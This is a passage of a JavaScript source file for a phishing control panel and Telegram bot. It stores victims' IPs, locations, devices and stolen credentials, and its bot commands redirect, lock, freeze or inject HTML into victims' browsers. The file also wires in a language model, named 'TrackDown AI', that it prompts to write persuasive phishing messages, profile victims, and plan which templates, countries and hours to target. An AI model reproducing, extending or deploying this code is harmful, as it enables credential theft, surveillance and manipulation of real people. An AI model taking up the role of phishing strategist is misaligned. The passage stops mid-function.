// Send email (placeholder - uses existing email system)
app.post('/api/panel/send-email', (req, res) => {
    const { company, emails, trackingLink, message, scheduled } = req.body;
    // In real implementation, this would call the email sending function
    res.json({ success: true, message: `سيتم إرسال ${emails.length} بريد` });
});

// Send SMS
app.post('/api/panel/send-sms', (req, res) => {
    const { numbers, message } = req.body;
    res.json({ success: true, message: `سيتم إرسال ${numbers.length} رسالة SMS` });
});

// Make call
app.post('/api/panel/make-call', (req, res) => {
    const { number, message } = req.body;
    res.json({ success: true, message: 'جاري إجراء المكالمة' });
});

// Save settings
app.post('/api/panel/settings', (req, res) => {
    res.json({ success: true, message: 'تم حفظ الإعدادات' });
});

// Live Map - Get all victims with coordinates
app.get('/api/panel/map', async (req, res) => {
    try {
        const result = await pool.query('SELECT ip, country, city, latitude, longitude, template, created_at FROM victims WHERE latitude IS NOT NULL AND longitude IS NOT NULL ORDER BY created_at DESC LIMIT 200');
        res.json(result.rows.map(v => ({
            ip: v.ip, country: v.country, city: v.city,
            lat: parseFloat(v.latitude), lon: parseFloat(v.longitude),
            template: v.template, time: v.created_at
        })));
    } catch(e) { res.json([]); }
});

// Stats per template
app.get('/api/panel/template-stats', async (req, res) => {
    try {
        const result = await pool.query("SELECT template as name, COUNT(*) as count FROM victims WHERE template IS NOT NULL GROUP BY template ORDER BY count DESC");
        res.json(result.rows.map(r => ({ name: r.name, count: parseInt(r.count) })));
    } catch(e) { res.json([]); }
});

// Hourly stats (last 24h)
app.get('/api/panel/hourly-stats', async (req, res) => {
    try {
        const result = await pool.query("SELECT date_trunc('hour', created_at) as hour, COUNT(*) as count FROM victims WHERE created_at > NOW() - INTERVAL '24 hours' GROUP BY hour ORDER BY hour");
        res.json(result.rows.map(r => ({ hour: r.hour, count: parseInt(r.count) })));
    } catch(e) { res.json([]); }
});

// VPN stats
app.get('/api/panel/vpn-stats', async (req, res) => {
    try {
        const vpn = await pool.query("SELECT COUNT(*) as count FROM victims WHERE is_vpn = true");
        const real = await pool.query("SELECT COUNT(*) as count FROM victims WHERE is_vpn = false");
        res.json({ vpn: parseInt(vpn.rows[0].count), real: parseInt(real.rows[0].count) });
    } catch(e) { res.json({ vpn: 0, real: 0 }); }
});

// Credentials list
app.get('/api/panel/credentials', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM credentials ORDER BY created_at DESC LIMIT 50');
        res.json(result.rows);
    } catch(e) { res.json([]); }
});

// Search victims
app.get('/api/panel/search', async (req, res) => {
    const q = req.query.q || '';
    try {
        const result = await pool.query(
            'SELECT * FROM victims WHERE ip LIKE $1 OR country LIKE $1 OR city LIKE $1 OR browser LIKE $1 ORDER BY created_at DESC LIMIT 20',
            [`%${q}%`]
        );
        res.json(result.rows);
    } catch(e) { res.json([]); }
});

// Helper function for country flags
function getCountryFlag(countryCode) {
    if (!countryCode || countryCode.length !== 2) return '🌍';
    const codePoints = countryCode.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
}

// =============================================
// 15 NEW BOT COMMANDS
// =============================================

bot.onText(/\/broadcast(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const text = (match[1] || '').trim();
    if (!text) {
        bot.sendMessage(chatId, "⚠️ Usage: /broadcast <message>\nExample: /broadcast System maintenance in 1 hour", {parse_mode: "HTML"});
        return;
    }
    broadcastMessages.push({ message: text, from: chatId, timestamp: Date.now() });
    const sessionCount = activeSessions.size;
    bot.sendMessage(chatId, `✅ <b>Broadcast Stored</b>\n\n📢 Message: ${text}\n👥 Active sessions: ${sessionCount}\n⏰ Time: ${new Date().toLocaleString()}`, {parse_mode: "HTML"});
});

bot.onText(/\/live/, async (msg) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    try {
        const totalVictims = await pool.query("SELECT COUNT(*) as count FROM victims");
        const todayVictims = await pool.query("SELECT COUNT(*) as count FROM victims WHERE created_at > NOW() - INTERVAL '24 hours'");
        const activeCount = activeSessions.size;
        let activeList = '';
        const now = Date.now();
        activeSessions.forEach((data, ip) => {
            if (now - data.lastSeen < 300000) {
                activeList += `\n🟢 <code>${ip}</code> - ${data.country || 'Unknown'} (${Math.floor((now - data.lastSeen) / 1000)}s ago)`;
            }
        });
        bot.sendMessage(chatId, `📊 <b>Live Dashboard</b>\n\n👥 Total Victims: ${totalVictims.rows[0].count}\n📅 Today: ${todayVictims.rows[0].count}\n🟢 Active Sessions: ${activeCount}\n${activeList || '\nNo active sessions'}`, {parse_mode: "HTML"});
    } catch(e) {
        bot.sendMessage(chatId, `📊 <b>Live Dashboard</b>\n\n🟢 Active Sessions: ${activeSessions.size}\n❌ DB Error: ${e.message}`, {parse_mode: "HTML"});
    }
});

bot.onText(/\/redirect(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const args = (match[1] || '').trim().split(/\s+/);
    if (args.length < 2) {
        bot.sendMessage(chatId, "⚠️ Usage: /redirect <ip> <url>\nExample: /redirect 192.168.1.1 https://example.com", {parse_mode: "HTML"});
        return;
    }
    const ip = args[0];
    const url = args.slice(1).join(' ');
    const cmds = victimCommands.get(ip) || [];
    cmds.push({ command: 'redirect', data: { url }, timestamp: Date.now() });
    victimCommands.set(ip, cmds);
    bot.sendMessage(chatId, `✅ <b>Redirect Command Stored</b>\n\n🎯 Target: <code>${ip}</code>\n🔗 URL: ${url}`, {parse_mode: "HTML"});
});

bot.onText(/\/popup(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const args = (match[1] || '').trim().split(/\s+/);
    if (args.length < 2) {
        bot.sendMessage(chatId, "⚠️ Usage: /popup <ip> <message>\nExample: /popup 192.168.1.1 Your session has expired", {parse_mode: "HTML"});
        return;
    }
    const ip = args[0];
    const message = args.slice(1).join(' ');
    const cmds = victimCommands.get(ip) || [];
    cmds.push({ command: 'popup', data: { message }, timestamp: Date.now() });
    victimCommands.set(ip, cmds);
    bot.sendMessage(chatId, `✅ <b>Popup Command Stored</b>\n\n🎯 Target: <code>${ip}</code>\n💬 Message: ${message}`, {parse_mode: "HTML"});
});

bot.onText(/\/vibrate(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const ip = (match[1] || '').trim();
    if (!ip) {
        bot.sendMessage(chatId, "⚠️ Usage: /vibrate <ip>\nExample: /vibrate 192.168.1.1", {parse_mode: "HTML"});
        return;
    }
    const cmds = victimCommands.get(ip) || [];
    cmds.push({ command: 'vibrate', data: {}, timestamp: Date.now() });
    victimCommands.set(ip, cmds);
    bot.sendMessage(chatId, `✅ <b>Vibrate Command Stored</b>\n\n🎯 Target: <code>${ip}</code>\n📳 Device will vibrate on next poll`, {parse_mode: "HTML"});
});

bot.onText(/\/sound(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const ip = (match[1] || '').trim();
    if (!ip) {
        bot.sendMessage(chatId, "⚠️ Usage: /sound <ip>\nExample: /sound 192.168.1.1", {parse_mode: "HTML"});
        return;
    }
    const cmds = victimCommands.get(ip) || [];
    cmds.push({ command: 'sound', data: {}, timestamp: Date.now() });
    victimCommands.set(ip, cmds);
    bot.sendMessage(chatId, `✅ <b>Sound Command Stored</b>\n\n🎯 Target: <code>${ip}</code>\n🔊 Sound will play on next poll`, {parse_mode: "HTML"});
});

bot.onText(/\/fullscreen(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const ip = (match[1] || '').trim();
    if (!ip) {
        bot.sendMessage(chatId, "⚠️ Usage: /fullscreen <ip>\nExample: /fullscreen 192.168.1.1", {parse_mode: "HTML"});
        return;
    }
    const cmds = victimCommands.get(ip) || [];
    cmds.push({ command: 'fullscreen', data: {}, timestamp: Date.now() });
    victimCommands.set(ip, cmds);
    bot.sendMessage(chatId, `✅ <b>Fullscreen Command Stored</b>\n\n🎯 Target: <code>${ip}</code>\n🖥️ Fullscreen will trigger on next poll`, {parse_mode: "HTML"});
});

bot.onText(/\/lock(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const args = (match[1] || '').trim().split(/\s+/);
    if (args.length < 1 || !args[0]) {
        bot.sendMessage(chatId, "⚠️ Usage: /lock <ip> [message]\nExample: /lock 192.168.1.1 Your device is locked", {parse_mode: "HTML"});
        return;
    }
    const ip = args[0];
    const message = args.slice(1).join(' ') || 'This page has been locked';
    const cmds = victimCommands.get(ip) || [];
    cmds.push({ command: 'lock', data: { message }, timestamp: Date.now() });
    victimCommands.set(ip, cmds);
    bot.sendMessage(chatId, `✅ <b>Lock Command Stored</b>\n\n🎯 Target: <code>${ip}</code>\n🔒 Message: ${message}`, {parse_mode: "HTML"});
});

bot.onText(/\/inject(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const args = (match[1] || '').trim().split(/\s+/);
    if (args.length < 2) {
        bot.sendMessage(chatId, "⚠️ Usage: /inject <ip> <html>\nExample: /inject 192.168.1.1 <h1>Injected</h1>", {parse_mode: "HTML"});
        return;
    }
    const ip = args[0];
    const html = args.slice(1).join(' ');
    const cmds = victimCommands.get(ip) || [];
    cmds.push({ command: 'inject', data: { html }, timestamp: Date.now() });
    victimCommands.set(ip, cmds);
    bot.sendMessage(chatId, `✅ <b>Inject Command Stored</b>\n\n🎯 Target: <code>${ip}</code>\n💉 HTML will be injected on next poll`, {parse_mode: "HTML"});
});

bot.onText(/\/freeze(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const ip = (match[1] || '').trim();
    if (!ip) {
        bot.sendMessage(chatId, "⚠️ Usage: /freeze <ip>\nExample: /freeze 192.168.1.1", {parse_mode: "HTML"});
        return;
    }
    const cmds = victimCommands.get(ip) || [];
    cmds.push({ command: 'freeze', data: {}, timestamp: Date.now() });
    victimCommands.set(ip, cmds);
    bot.sendMessage(chatId, `✅ <b>Freeze Command Stored</b>\n\n🎯 Target: <code>${ip}</code>\n❄️ Page will freeze on next poll`, {parse_mode: "HTML"});
});

bot.onText(/\/blacklist(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const ip = (match[1] || '').trim();
    if (!ip) {
        bot.sendMessage(chatId, "⚠️ Usage: /blacklist <ip>\nExample: /blacklist 192.168.1.1", {parse_mode: "HTML"});
        return;
    }
    try {
        await pool.query(`INSERT INTO blocked_ips (user_id, ip, reason) VALUES ($1, $2, $3)`, [chatId.toString(36), ip, 'Blacklisted via /blacklist command']);
        blockedIPs.set(chatId.toString(36) + '_' + ip, true);
        bot.sendMessage(chatId, `✅ <b>IP Blacklisted</b>\n\n🚫 IP: <code>${ip}</code>\n📝 Reason: Permanent blacklist\n⏰ Time: ${new Date().toLocaleString()}`, {parse_mode: "HTML"});
    } catch(e) {
        bot.sendMessage(chatId, `❌ Error blacklisting IP: ${e.message}`, {parse_mode: "HTML"});
    }
});

bot.onText(/\/whitelist(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const country = (match[1] || '').trim();
    if (!country) {
        const list = whitelistedCountries.size > 0 ? Array.from(whitelistedCountries).join(', ') : 'None';
        bot.sendMessage(chatId, `🌍 <b>Whitelisted Countries</b>\n\n${list}\n\nUsage: /whitelist <country> (toggle on/off)`, {parse_mode: "HTML"});
        return;
    }
    if (whitelistedCountries.has(country)) {
        whitelistedCountries.delete(country);
        bot.sendMessage(chatId, `✅ <b>Country Removed from Whitelist</b>\n\n🌍 ${country} removed\n📋 Current list: ${Array.from(whitelistedCountries).join(', ') || 'Empty'}`, {parse_mode: "HTML"});
    } else {
        whitelistedCountries.add(country);
        bot.sendMessage(chatId, `✅ <b>Country Added to Whitelist</b>\n\n🌍 ${country} added\n📋 Current list: ${Array.from(whitelistedCountries).join(', ')}`, {parse_mode: "HTML"});
    }
});

bot.onText(/\/report(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const ip = (match[1] || '').trim();
    if (!ip) {
        bot.sendMessage(chatId, "⚠️ Usage: /report <ip>\nExample: /report 192.168.1.1", {parse_mode: "HTML"});
        return;
    }
    try {
        const victims = await pool.query("SELECT * FROM victims WHERE ip = $1 ORDER BY created_at DESC", [ip]);
        const creds = await pool.query("SELECT * FROM credentials WHERE user_id IN (SELECT DISTINCT user_id FROM victims WHERE ip = $1)", [ip]);
        const clicks = await pool.query("SELECT COUNT(*) as count FROM link_clicks WHERE ip = $1", [ip]);
        const isBlocked = await pool.query("SELECT * FROM blocked_ips WHERE ip = $1", [ip]);
        
        if (victims.rows.length === 0) {
            bot.sendMessage(chatId, `⚠️ No records found for IP: <code>${ip}</code>`, {parse_mode: "HTML"});
            return;
        }
        
        const v = victims.rows[0];
        let report = `📋 <b>Victim Report: ${ip}</b>\n\n`;
        report += `🌐 IP: <code>${ip}</code>\n`;
        report += `📍 Location: ${v.country || 'Unknown'}, ${v.city || 'Unknown'}\n`;
        report += `📱 Device: ${v.device || 'Unknown'}\n`;
        report += `🌐 Browser: ${v.browser || 'Unknown'}\n`;
        report += `💻 OS: ${v.os || 'Unknown'}\n`;
        report += `📺 Screen: ${v.screen || 'Unknown'}\n`;
        report += `🔒 VPN: ${v.is_vpn ? 'Yes' : 'No'}\n`;
        report += `📊 Total Visits: ${victims.rows.length}\n`;
        report += `🖱️ Total Clicks: ${clicks.rows[0].count}\n`;
        report += `🚫 Blocked: ${isBlocked.rows.length > 0 ? 'Yes' : 'No'}\n`;
        report += `⏰ First Seen: ${v.created_at}\n`;
        
        if (victims.rows.length > 1) {
            report += `\n📂 <b>Templates Visited:</b>\n`;
            const templates = [...new Set(victims.rows.map(r => r.template))];
            templates.forEach(t => { report += `  • ${t}\n`; });
        }
        
        if (creds.rows.length > 0) {
            report += `\n🔑 <b>Credentials (${creds.rows.length}):</b>\n`;
            creds.rows.slice(0, 5).forEach(c => {
                report += `  • ${c.platform}: ${c.email || 'N/A'}\n`;
            });
        }
        
        const session = activeSessions.get(ip);
        if (session) {
            report += `\n🟢 <b>Currently Online</b> (last seen ${Math.floor((Date.now() - session.lastSeen) / 1000)}s ago)`;
        }
        
        bot.sendMessage(chatId, report, {parse_mode: "HTML"});
    } catch(e) {
        bot.sendMessage(chatId, `❌ Error generating report: ${e.message}`, {parse_mode: "HTML"});
    }
});

bot.onText(/\/online/, async (msg) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const now = Date.now();
    const fiveMinAgo = now - 300000;
    let onlineList = '';
    let count = 0;
    activeSessions.forEach((data, ip) => {
        if (data.lastSeen > fiveMinAgo) {
            count++;
            const ago = Math.floor((now - data.lastSeen) / 1000);
            onlineList += `\n🟢 <code>${ip}</code> - ${data.country || 'Unknown'} | ${data.userAgent || 'Unknown'} | ${ago}s ago`;
        }
    });
    bot.sendMessage(chatId, `👁️ <b>Online Victims (Last 5 min)</b>\n\n📊 Count: ${count}${onlineList || '\n\nNo active victims right now.'}`, {parse_mode: "HTML"});
});

bot.onText(/\/commands/, async (msg) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const commandList = `📜 <b>All Available Commands</b>\n
🔗 <b>Link Generation:</b>
• Send any URL to generate phishing links
• Multiple templates available (Google, Facebook, etc.)

🎯 <b>Victim Control:</b>
• /redirect [ip] [url] - Redirect victim to URL
• /popup [ip] [message] - Show popup on victim device
• /vibrate [ip] - Vibrate victim device
• /sound [ip] - Play sound on victim device
• /fullscreen [ip] - Force fullscreen on victim
• /lock [ip] [message] - Lock victim page
• /inject [ip] [html] - Inject HTML into victim page
• /freeze [ip] - Freeze victim page

📊 <b>Monitoring:</b>
• /live - Live victim count & sessions
• /online - Currently active victims
• /report [ip] - Full victim report

🛡️ <b>Protection:</b>
• /blacklist [ip] - Permanently block IP
• /whitelist [country] - Toggle country whitelist

📢 <b>Communication:</b>
• /broadcast [message] - Store broadcast message

🤖 <b>الذكاء الاصطناعي:</b>
• /ai [سؤال] - اسأل الذكاء الاصطناعي أي سؤال
• /analyze [ip] - تحليل ذكي للضحية
• /phish [وصف الهدف] - توليد رسائل تصيد ذكية
• /translate [نص] - ترجمة تلقائية
• /summarize - تقرير ذكي شامل
• /suggest - اقتراحات استراتيجية
• /rewrite [نص] - إعادة كتابة احترافية

⚙️ <b>Other:</b>
• /commands - Show this help menu`;
    bot.sendMessage(chatId, commandList, {parse_mode: "HTML"});
});

// =============================================
// AI-POWERED BOT COMMANDS
// =============================================

async function askAI(systemPrompt, userPrompt, maxTokens = 8192) {
    try {
        const response = await openai.chat.completions.create({
            model: "gpt-5-mini",
            messages: [
                { role: "system", content: systemPrompt },
                { role: "user", content: userPrompt }
            ],
            max_completion_tokens: maxTokens,
        });
        return response.choices[0]?.message?.content || 'لا يوجد رد';
    } catch (err) {
        console.log('AI Error:', err.message);
        return '❌ حدث خطأ في الذكاء الاصطناعي: ' + err.message;
    }
}

async function askAIWithHistory(chatId, userPrompt, maxTokens = 8192) {
    try {
        if (!aiChatHistory.has(chatId)) aiChatHistory.set(chatId, []);
        const history = aiChatHistory.get(chatId);
        history.push({ role: "user", content: userPrompt });
        if (history.length > 20) history.splice(0, history.length - 20);
        const messages = [
            { role: "system", content: 'أنت مساعد ذكي متقدم اسمك TrackDown AI. أجب دائماً باللغة العربية بشكل مفصل ومفيد. أنت خبير في الأمن السيبراني والهندسة الاجتماعية. تذكر المحادثة السابقة وأجب في سياقها.' },
            ...history
        ];
        const response = await openai.chat.completions.create({
            model: "gpt-5-mini",
            messages,
            max_completion_tokens: maxTokens,
        });
        const answer = response.choices[0]?.message?.content || 'لا يوجد رد';
        history.push({ role: "assistant", content: answer });
        return answer;
    } catch (err) {
        console.log('AI Error:', err.message);
        return '❌ حدث خطأ في الذكاء الاصطناعي: ' + err.message;
    }
}

function showAIMenu(chatId) {
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '💬 محادثة ذكية', callback_data: 'ai_chat' },
                    { text: '🔍 تحليل ضحية', callback_data: 'ai_analyze' }
                ],
                [
                    { text: '✍️ رسالة تصيد', callback_data: 'ai_phish' },
                    { text: '🌐 ترجمة نص', callback_data: 'ai_translate' }
                ],
                [
                    { text: '📊 تقرير شامل', callback_data: 'ai_summarize' },
                    { text: '💡 اقتراحات', callback_data: 'ai_suggest' }
                ],
                [
                    { text: '✨ إعادة كتابة', callback_data: 'ai_rewrite' },
                    { text: '🧹 محادثة جديدة', callback_data: 'ai_clear' }
                ],
                [
                    { text: '❌ إغلاق', callback_data: 'ai_close' }
                ]
            ]
        },
        parse_mode: "HTML"
    };
    bot.sendMessage(chatId, `🤖 <b>TrackDown AI - القائمة الذكية</b>\n\nاختر الخدمة المطلوبة:

💬 <b>محادثة ذكية</b> - تحدث مع AI بشكل متواصل
🔍 <b>تحليل ضحية</b> - حلل بيانات ضحية بالـ IP
✍️ <b>رسالة تصيد</b> - اكتب رسالة مقنعة
🌐 <b>ترجمة</b> - ترجم أي نص
📊 <b>تقرير شامل</b> - ملخص الأداء الكامل
💡 <b>اقتراحات</b> - استراتيجية ذكية
✨ <b>إعادة كتابة</b> - أعد صياغة نص

أو أرسل <code>/ai سؤالك</code> مباشرة`, keyboard);
}

bot.onText(/\/ai$/, async (msg) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    showAIMenu(chatId);
});

bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    adminChatIds.add(chatId);

    if (!data.startsWith('ai_')) return;

    bot.answerCallbackQuery(callbackQuery.id);

    if (data === 'ai_chat') {
        aiChatMode.set(chatId, true);
        aiWaitingFor.delete(chatId);
        bot.sendMessage(chatId, `💬 <b>وضع المحادثة الذكية</b>\n\n✅ تم تفعيل وضع المحادثة!\nأرسل أي رسالة وسأجيبك فوراً.\nالمحادثة مستمرة وأتذكر كل ما قلته.\n\nأرسل /stop لإيقاف المحادثة.`, {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [[{ text: '⏹ إيقاف المحادثة' }], [{ text: '🧹 مسح السجل' }, { text: '📋 القائمة الرئيسية' }]],
                resize_keyboard: true,
                one_time_keyboard: false
            }
        });
    } else if (data === 'ai_analyze') {
        aiWaitingFor.set(chatId, 'analyze');
        aiChatMode.delete(chatId);
        bot.sendMessage(chatId, '🔍 أرسل عنوان IP الضحية للتحليل:', {
            reply_markup: { force_reply: true }
        });
    } else if (data === 'ai_phish') {
        aiWaitingFor.set(chatId, 'phish');
        aiChatMode.delete(chatId);
        bot.sendMessage(chatId, '✍️ أرسل وصف الهدف (مثال: موظف بنك، طالب جامعي):', {
            reply_markup: { force_reply: true }
        });
    } else if (data === 'ai_translate') {
        aiWaitingFor.set(chatId, 'translate');
        aiChatMode.delete(chatId);
        bot.sendMessage(chatId, '🌐 أرسل النص المراد ترجمته:', {
            reply_markup: { force_reply: true }
        });
    } else if (data === 'ai_summarize') {
        aiWaitingFor.delete(chatId);
        aiChatMode.delete(chatId);
        await handleSummarize(chatId);
    } else if (data === 'ai_suggest') {
        aiWaitingFor.delete(chatId);
        aiChatMode.delete(chatId);
        await handleSuggest(chatId);
    } else if (data === 'ai_rewrite') {
        aiWaitingFor.set(chatId, 'rewrite');
        aiChatMode.delete(chatId);
        bot.sendMessage(chatId, '✨ أرسل النص المراد إعادة كتابته:', {
            reply_markup: { force_reply: true }
        });
    } else if (data === 'ai_clear') {
        aiChatHistory.delete(chatId);
        bot.sendMessage(chatId, '🧹 تم مسح سجل المحادثة! يمكنك البدء من جديد.');
    } else if (data === 'ai_close') {
        aiChatMode.delete(chatId);
        aiWaitingFor.delete(chatId);
        bot.sendMessage(chatId, '❌ تم إغلاق القائمة.', {
            reply_markup: { remove_keyboard: true }
        });
    } else if (data === 'ai_back') {
        aiChatMode.delete(chatId);
        aiWaitingFor.delete(chatId);
        showAIMenu(chatId);
    }
});

async function handleSummarize(chatId) {
    bot.sendMessage(chatId, '📊 جاري تحليل وتلخيص البيانات...');
    try {
        const totalR = await pool.query('SELECT COUNT(*) FROM victims');
        const todayR = await pool.query("SELECT COUNT(*) FROM victims WHERE created_at >= CURRENT_DATE");
        const countryR = await pool.query("SELECT country, COUNT(*) as cnt FROM victims GROUP BY country ORDER BY cnt DESC LIMIT 10");
        const templateR = await pool.query("SELECT template, COUNT(*) as cnt FROM victims GROUP BY template ORDER BY cnt DESC LIMIT 10");
        const vpnR = await pool.query("SELECT COUNT(*) FROM victims WHERE vpn = 'Yes'");
        const credsR = await pool.query("SELECT COUNT(*) FROM victims WHERE username IS NOT NULL AND username != ''");
        const locR = await pool.query("SELECT COUNT(*) FROM victims WHERE latitude IS NOT NULL");
        const statsData = `Total: ${totalR.rows[0].count}, Today: ${todayR.rows[0].count}, VPN: ${vpnR.rows[0].count}, Creds: ${credsR.rows[0].count}, Location: ${locR.rows[0].count}\nCountries: ${countryR.rows.map(r => `${r.country}:${r.cnt}`).join(',')}\nTemplates: ${templateR.rows.map(r => `${r.template}:${r.cnt}`).join(',')}`;
        const summary = await askAI(
            'أنت محلل بيانات خبير. حلل الإحصائيات وقدم: 1.ملخص شامل 2.تحليل الاتجاهات 3.أفضل القوالب 4.الدول الأكثر استهدافاً 5.نسبة النجاح 6.توصيات 7.استراتيجية مقترحة. أجب بالعربية.',
            statsData
        );
        const backBtn = { reply_markup: { inline_keyboard: [[{ text: '📋 القائمة الرئيسية', callback_data: 'ai_back' }]] }, parse_mode: "HTML" };
        bot.sendMessage(chatId, `📊 <b>تقرير الذكاء الاصطناعي</b>\n\n${summary}`, backBtn);
    } catch (err) { bot.sendMessage(chatId, '❌ خطأ: ' + err.message); }
}

async function handleSuggest(chatId) {
    bot.sendMessage(chatId, '💡 جاري تحليل أفضل استراتيجية...');
    try {
        const statsR = await pool.query(`SELECT template, country, COUNT(*) as cnt, COUNT(CASE WHEN username IS NOT NULL AND username != '' THEN 1 END) as creds_count FROM victims GROUP BY template, country ORDER BY cnt DESC LIMIT 20`);
        const hourR = await pool.query(`SELECT EXTRACT(HOUR FROM created_at) as hour, COUNT(*) as cnt FROM victims GROUP BY hour ORDER BY cnt DESC LIMIT 5`);
        const data = `Performance: ${JSON.stringify(statsR.rows)}\nBest Hours: ${JSON.stringify(hourR.rows)}`;
        const suggestion = await askAI(
            'أنت استراتيجي خبير. بناءً على البيانات: 1.أفضل 3 قوالب 2.أفضل أوقات 3.أفضل دول 4.استراتيجية 5.نصائح 6.قوالب تجنبها 7.خطة 24 ساعة. أجب بالعربية.',
            data
        );
        const backBtn = { reply_markup: { inline_keyboard: [[{ text: '📋 القائمة الرئيسية', callback_data: 'ai_back' }]] }, parse_mode: "HTML" };
        bot.sendMessage(chatId, `💡 <b>اقتراحات الذكاء الاصطناعي</b>\n\n${suggestion}`, backBtn);
    } catch (err) { bot.sendMessage(chatId, '❌ خطأ: ' + err.message); }
}

bot.onText(/\/ai (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    const question = match[1];
    bot.sendMessage(chatId, '🤖 جاري التفكير...');
    const answer = await askAIWithHistory(chatId, question);
    const keyboard = { reply_markup: { inline_keyboard: [[{ text: '📋 القائمة', callback_data: 'ai_back' }, { text: '🧹 مسح السجل', callback_data: 'ai_clear' }]] }, parse_mode: "HTML" };
    bot.sendMessage(chatId, `🤖 <b>الذكاء الاصطناعي</b>\n\n${answer}`, keyboard);
});

bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    aiChatMode.delete(chatId);
    aiWaitingFor.delete(chatId);
    bot.sendMessage(chatId, '⏹ تم إيقاف وضع المحادثة.', {
        reply_markup: { remove_keyboard: true }
    });
});

bot.onText(/\/analyze (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId);
    await handleAnalyze(chatId, match[1].trim());
});

async function fetchIPInfo(ip) {
    try {
        const fetch = (await import('node-fetch')).default;
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`);
        const data = await res.json();
        if (data.status === 'success') return data;
        return null;
    } catch (e) {
        console.log('IP API Error:', e.message);
        return null;
    }
}

function isPrivateIP(ip) {
    const parts = ip.split('.').map(Number);
    if (parts.length !== 4) return false;
    if (parts[0] === 10) return true;
    if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
    if (parts[0] === 192 && parts[1] === 168) return true;
    if (parts[0] === 127) return true;
    if (parts[0] === 169 && parts[1] === 254) return true;
    return false;
}

async function handleIPLookup(chatId, targetIP) {
    bot.sendMessage(chatId, '🌐 جاري فحص IP...');
    try {
        const ipInfo = await fetchIPInfo(targetIP);
        const isPrivate = isPrivateIP(targetIP);

        let msg = `🌐 <b>فحص IP سريع: ${targetIP}</b>\n\n`;

        if (isPrivate) {
            msg += `🏠 <b>النوع:</b> IP خاص (شبكة محلية)\n`;
            msg += `📍 <b>النطاق:</b> ${targetIP.startsWith('192.168') ? 'شبكة منزلية/مكتبية' : targetIP.startsWith('10.') ? 'شبكة كبيرة' : targetIP.startsWith('172.') ? 'شبكة متوسطة' : 'Loopback'}\n`;
            msg += `\n⚠️ هذا IP داخلي ولا يمكن تحديد موقعه الجغرافي.`;
        }

        if (ipInfo) {
            msg += `🌍 <b>النوع:</b> IP عام\n\n`;
            msg += `📍 <b>الموقع:</b>\n`;
            msg += `  🌏 ${ipInfo.continent || '?'}\n`;
            msg += `  🏳 ${ipInfo.country || '?'} (${ipInfo.countryCode || '?'})\n`;
            msg += `  🏙 ${ipInfo.regionName || '?'}, ${ipInfo.city || '?'}\n`;
            if (ipInfo.district) msg += `  📌 ${ipInfo.district}\n`;
            if (ipInfo.zip) msg += `  📮 ZIP: ${ipInfo.zip}\n`;
            msg += `  📐 ${ipInfo.lat}, ${ipInfo.lon}\n`;
            msg += `\n🏢 <b>مزود الخدمة:</b>\n`;
            msg += `  📡 ISP: ${ipInfo.isp || '?'}\n`;
            msg += `  🏛 Org: ${ipInfo.org || '?'}\n`;
            msg += `  🔗 AS: ${ipInfo.asname || '?'}\n`;
            if (ipInfo.reverse) msg += `  🔄 DNS: ${ipInfo.reverse}\n`;
            msg += `\n⚙️ <b>تفاصيل:</b>\n`;
            msg += `  ⏰ التوقيت: ${ipInfo.timezone || '?'}\n`;
            msg += `  💰 العملة: ${ipInfo.currency || '?'}\n`;
            msg += `  📱 موبايل: ${ipInfo.mobile ? 'نعم ✅' : 'لا ❌'}\n`;
            msg += `  🛡 VPN/Proxy: ${ipInfo.proxy ? '🔴 نعم' : '🟢 لا'}\n`;
            msg += `  🖥 استضافة: ${ipInfo.hosting ? '🔴 نعم' : '🟢 لا'}\n`;
            if (ipInfo.lat && ipInfo.lon) {
                msg += `\n🗺 <a href="https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}">فتح في خرائط Google</a>`;
            }
        } else if (!isPrivate) {
            msg += `❌ لم يتم العثور على معلومات لهذا الـ IP.`;
        }

        const btns = { reply_markup: { inline_keyboard: [
            [{ text: '🔍 تحليل AI كامل', callback_data: 'ai_analyze' }],
            [{ text: '🌐 فحص IP آخر', callback_data: 'ip_lookup' }],
            [{ text: '📋 القائمة الرئيسية', callback_data: 'back_main' }]
        ] }, parse_mode: "HTML", disable_web_page_preview: true };
        bot.sendMessage(chatId, msg, btns);
    } catch (err) { bot.sendMessage(chatId, '❌ خطأ: ' + err.message); }
}

async function handleAnalyze(chatId, targetIP) {
    bot.sendMessage(chatId, '🔍 جاري تحليل الضحية بالذكاء الاصطناعي...');
    try {
